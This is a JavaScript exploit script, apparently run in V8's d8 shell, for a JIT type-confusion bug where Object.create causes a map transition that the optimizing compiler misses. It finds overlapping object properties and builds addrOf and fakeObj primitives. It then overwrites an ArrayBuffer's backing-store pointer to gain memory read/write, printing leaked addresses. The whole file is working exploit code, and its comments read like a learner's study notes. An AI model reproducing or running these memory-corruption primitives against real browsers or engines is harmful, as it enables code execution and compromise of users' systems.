const LOOP_COUNT = 10000;

function makeObj(pValues) {
  // Create one inline property for triggering the CheckMaps operation
  let obj = { inline: 1234 };

  // Create 32 out-of-line properties for finding the overlapping backing store
  for (let i = 1; i < 32; i++) {
    Object.defineProperty(obj, 'p' + i, { writable: true, value: pValues[i] });
  }

  return obj;
}

let p1, p2;

function findOverlappingProperties() {
  // Create an array of all 32 property names such as p1..p32
  let pNames = [];
  for (let i = 1; i < 32; i++) {
    pNames[i] = 'p' + i;
  }

  // Create eval of our vuln function that will generate code during runtime
  eval(`
    function vuln(obj) {
      // Access inline property of obj, forcing a CheckMap operation
      obj.inline;

      // Force a Map Transition via our side-effect
      this.Object.create(obj);

      // Trigger our type-confusion by accessing out-of-bound properties
      ${pNames.map((p) => `let ${p} = obj.${p};`).join('\n')}
      return [${pNames.join(', ')}];
    }
  `);

  // Create an array of negative values from -1 to -32 to be used
  // for out makeObj function
  let pValues = [];
  for (let i = 1; i < 32; i++) {
    pValues[i] = -i;
  }

  // Trigger the vuln function to find the overlapping properties
  for (let i = 0; i < LOOP_COUNT; i++) {
    let obj = makeObj(pValues); // Create an object with 32 properties, all with empty objects
    let res = vuln(obj);
    for (let i = 1; i < res.length; i++) {
      // If i is not the same value with -res[i] (we do not count the initial array before Map transition), and res[i] is between -32 and 0, it overlaps
      if (i !== -res[i] && res[i] < 0 && res[i] > -32) {
        [p1, p2] = [i, -res[i]];
        return obj;
      }
    }
  }
  throw "[!] Failed to find overlapping properties";
}

// Conversion Buffers
let floatView = new Float64Array(1);
let uint64View = new BigUint64Array(floatView.buffer);

Number.prototype.toBigInt = function toBigInt() {
  floatView[0] = this;
  return uint64View[0];
};
BigInt.prototype.toNumber = function toNumber() {
  uint64View[0] = this;
  return floatView[0];
};

function addrOf(object) {
  eval(`
  function vuln(obj) {
    obj.inline;
    this.Object.create(obj);
    return obj.p${p1}.x1;
  }
  `);

  let pValues = [];
  pValues[p1] = { x1: 13.37, x2: 13.38 }; // accessed as float
  pValues[p2] = { y: object };            // accessed as JSObject and will be accessed as float <-- still not get why we need to use a different map

  // Use loop for triggering the compiler
  for (let i = 0; i < 10000; i++) {
    let obj = makeObj(pValues);
    let res = vuln(obj);
    if (res != 13.37) {
      // %DebugPrint(object);

      return res.toBigInt() - 1n; // subtract 1n from address due to pointer tagging.
    }
  }
  throw "[!] AddrOf Primitive Failed"
}

function fakeObj(object, value) {
  eval(`
  function vuln(obj) {
    obj.inline;
    this.Object.create(obj);
    let orig = obj.p${p1}.x2;
    obj.p${p1}.x2 = ${value.toNumber()};  // we assign the second property (the backing storage) to whatever we want
                                          // also, we need to transfer it into float as p1.x2 expects a float value
    return orig;
  }
`);

  let pValues = [];
  let objWithInlineProperties = { x1: 13.37, x2: 13.38 }
  pValues[p1] = objWithInlineProperties;   // the second property will point to the backing storage of the ArrayBuffer
  pValues[p2] = object;                    // directly pass the ArrayBuffer object for leaking the backing storage address

  for (let i = 0; i < 10000; i++) {
    objWithInlineProperties.x2 = 13.38; // force CheckMaps and Redundancy Elimination

    let obj = makeObj(pValues);
    let res = vuln(obj);
    if (res != 13.38) {
      return res.toBigInt();
    }
  }
}

function exploit() {
  print("[+] Finding Overlapping Properties");
  findOverlappingProperties();
  print(`[+] Properties p${p1} and p${p2} overlap!`);

  // Flow:
  // 1. Leak address of the second buffer
  // 2. Overwrite backing storage of the first buffer with leaked address


  let arrBuff1 = new ArrayBuffer(1024);
  let arrBuff2 = new ArrayBuffer(1024);

  print("[+] Leaking ArrayBuffer 2 address...");
  let arrBuff2Address = addrOf(arrBuff2);
  print(`[+] ArrayBuffer 2 address: 0x${arrBuff2Address.toString(16)}`);

  print("[+] Corrupting ArrayBuffer 1 backing storage address ...");
  // Overwrite backing storage pointer of the first buffer with the address of the second buffer
  let originalArrBuff1BackingStore = fakeObj(arrBuff1, arrBuff2Address);
  print(`[+] Original ArrayBuffer 1 backing store: 0x${originalArrBuff1BackingStore.toString(16)}`);

  // Get the backing store of 2nd buffer at index 4 of the first buffer
  let view1 = new BigUint64Array(arrBuff1); // use BigUint64Array to get byte representation of the data
  let arrBuff2BackingStore = view1[4];
  print(`[+] ArrayBuffer 2 Backing Store: 0x${arrBuff2BackingStore.toString(16)}`);
  % DebugPrint(arrBuff2);
}

exploit();